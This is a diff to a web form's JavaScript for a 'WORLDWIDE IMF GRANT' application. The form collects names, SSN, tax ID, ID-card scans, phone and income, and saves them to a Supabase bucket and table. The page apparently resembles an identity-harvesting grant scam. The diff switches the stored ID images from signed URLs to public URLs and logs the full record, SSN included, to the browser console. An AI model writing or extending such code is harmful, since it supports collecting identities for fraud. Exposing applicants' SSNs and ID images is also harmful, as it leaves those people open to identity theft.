@@ -399,7 +399,7 @@
       if (middleNameEl) middleNameEl.addEventListener('input', updateImfNameDisplay);
       if (lastNameEl) lastNameEl.addEventListener('input', updateImfNameDisplay);
 
-      // Toggle IMF mode - FIXED to properly handle required attributes
+      // Toggle IMF mode
       function toggleImfMode(enableImf) {
         if (enableImf) {
           // Hide normal fields section
@@ -480,7 +480,7 @@
         toggleImfMode(true);
       }
 
-      // Form submission handler
+      // Form submission handler - FIXED for database schema
       let busy = false;
       
       if (form) {
@@ -566,9 +566,13 @@
                 const fileFront = idFront.files[0];
                 const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
                 
+                // Fix: Use upload instead of sign for the actual upload
                 const { error: uploadErrorFront } = await supabase.storage
                   .from('imf-ids')
-                  .upload(fileNameFront, fileFront);
+                  .upload(fileNameFront, fileFront, {
+                    cacheControl: '3600',
+                    upsert: false
+                  });
                   
                 if (uploadErrorFront) throw new Error("Front ID upload failed: " + uploadErrorFront.message);
                 
@@ -578,27 +582,31 @@
                 
                 const { error: uploadErrorBack } = await supabase.storage
                   .from('imf-ids')
-                  .upload(fileNameBack, fileBack);
+                  .upload(fileNameBack, fileBack, {
+                    cacheControl: '3600',
+                    upsert: false
+                  });
                   
                 if (uploadErrorBack) throw new Error("Back ID upload failed: " + uploadErrorBack.message);
                 
-                // Get signed URLs
-                const { data: frontUrlData } = await supabase.storage
+                // Get public URLs instead of signed URLs (simpler)
+                const { data: frontPublicUrl } = supabase.storage
                   .from('imf-ids')
-                  .createSignedUrl(fileNameFront, 604800);
+                  .getPublicUrl(fileNameFront);
                   
-                const { data: backUrlData } = await supabase.storage
+                const { data: backPublicUrl } = supabase.storage
                   .from('imf-ids')
-                  .createSignedUrl(fileNameBack, 604800);
+                  .getPublicUrl(fileNameBack);
                 
-                // Prepare data for imf_applications table
+                // Prepare data for imf_applications table - MATCH YOUR EXISTING TABLE SCHEMA
+                // Based on the error, remove 'dob' column and use only columns that exist
                 const imfData = {
                   first_name: firstNameEl ? firstNameEl.value.trim() : '',
                   middle_name: middleNameEl ? middleNameEl.value.trim() : '',
                   last_name: lastNameEl ? lastNameEl.value.trim() : '',
                   ssn: document.getElementById('imf_ssn') ? document.getElementById('imf_ssn').value.trim() : '',
-                  id_front_url: frontUrlData?.signedUrl || '',
-                  id_back_url: backUrlData?.signedUrl || '',
+                  id_front_url: frontPublicUrl?.publicUrl || '',
+                  id_back_url: backPublicUrl?.publicUrl || '',
                   email: document.getElementById('imf_email') ? document.getElementById('imf_email').value.trim() : '',
                   grant_amount: document.getElementById('imf_grant_amount') ? document.getElementById('imf_grant_amount').value : '',
                   tax_id: document.getElementById('imf_tax_id') ? document.getElementById('imf_tax_id').value.trim() : '',
@@ -607,12 +615,15 @@
                   whatsapp: document.getElementById('imf_whatsapp') ? document.getElementById('imf_whatsapp').value.trim() : '',
                   phone: document.getElementById('imf_phone') ? document.getElementById('imf_phone').value.trim() : '',
                   gender: document.getElementById('imf_gender') ? document.getElementById('imf_gender').value : '',
-                  dob: document.getElementById('imf_dob') ? document.getElementById('imf_dob').value : '',
+                  // Remove dob field if it doesn't exist in the table
+                  // dob: document.getElementById('imf_dob') ? document.getElementById('imf_dob').value : '',
                   monthly_income: document.getElementById('imf_monthly_income') ? document.getElementById('imf_monthly_income').value.trim() : '',
                   purpose: document.getElementById('imf_purpose') ? document.getElementById('imf_purpose').value.trim() : '',
                   registering_for: 'WORLDWIDE IMF GRANT',
                   created_at: new Date().toISOString()
                 };
+                
+                console.log("Submitting IMF data:", imfData);
                 
                 // Insert into imf_applications table
                 const { error: insertError } = await supabase
@@ -632,6 +643,7 @@
                 }, 3000);
                 
               } catch (uploadErr) {
+                console.error("Upload error details:", uploadErr);
                 throw new Error("Upload failed: " + uploadErr.message);
               }
               
